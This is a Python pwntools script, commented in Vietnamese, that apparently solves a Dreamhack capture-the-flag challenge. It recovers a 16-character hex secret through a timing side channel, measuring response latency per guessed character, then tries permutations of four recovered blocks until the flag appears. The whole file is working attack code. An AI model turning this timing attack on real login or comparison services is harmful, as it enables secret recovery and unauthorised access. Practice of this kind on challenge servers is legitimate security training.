from pwn import *
from time import time

p = remote('host1.dreamhack.games', 20317) # Thay port nếu đúng
p.sendline(b'')
p.recv(4)

known_prefix = ""

while True:
    # 1. Nhận input từ bạn
    known_prefix = input(f"Nhập chuỗi đã biết (hiện tại: '{known_prefix}'): ").strip()
    if len(known_prefix) >= 16:
        print("Đã tìm đủ 16 ký tự. Bắt đầu thử hoán vị.")
        break
    
    print("-" * 30)
    print(f"[*] Đang thử các ký tự tiếp theo cho prefix: '{known_prefix}'")
    
    # 2. Tạo payload dựa trên khối hiện tại
    # Logic này đảm bảo ta luôn xây dựng các khối 4 ký tự
    current_block_index = len(known_prefix) // 4
    current_block_prefix = known_prefix[current_block_index*4:]
    
    times = {}
    
    # 3. Gửi payload và đo thời gian
    for char_to_try in '0123456789abcdef':
        payload_block = (current_block_prefix + char_to_try).ljust(4)
        payload = (payload_block * 4).encode()
        
        latencies = []
        # Gửi 16 lần để lấy mẫu, giống script gốc
        for _ in range(16):
            p.sendline(payload)
            start_time = time()
            p.recv(4)
            end_time = time()
            latencies.append(end_time - start_time)
        
        # 4. In kết quả cho bạn xem
        # In ra 6 giá trị lớn nhất, giống hệt script gốc
        print(f"{sorted(latencies)[-10:]} {char_to_try}")
        
    print("-" * 30)

# Phần thử hoán vị sau khi đã tìm đủ
blocks = [known_prefix[i:i+4] for i in range(0, 16, 4)]
print(f"[*] 4 khối đã tìm được: {blocks}")
import itertools
for p_tuple in itertools.permutations(blocks):
    candidate = "".join(p_tuple)
    print(f"[*] Thử: {candidate}")
    p.sendline(candidate.encode())
    try:
        response = p.recvuntil(b"}", timeout=2)
        if b'DH' in response:
            print(f"\n[!!!] FLAG: {response.decode()}")
            break
        else:
            # Nếu nhận được gì đó không phải flag, server có thể vẫn mở
            print(f"    Phản hồi: {response}")
    except EOFError:
        # Nếu server đóng kết nối, phải kết nối lại
        print("    Sai. Kết nối lại...")
        p = remote('host1.dreamhack.games', 20317)
        p.sendline(b'')
        p.recv(4)
        continue

p.interactive()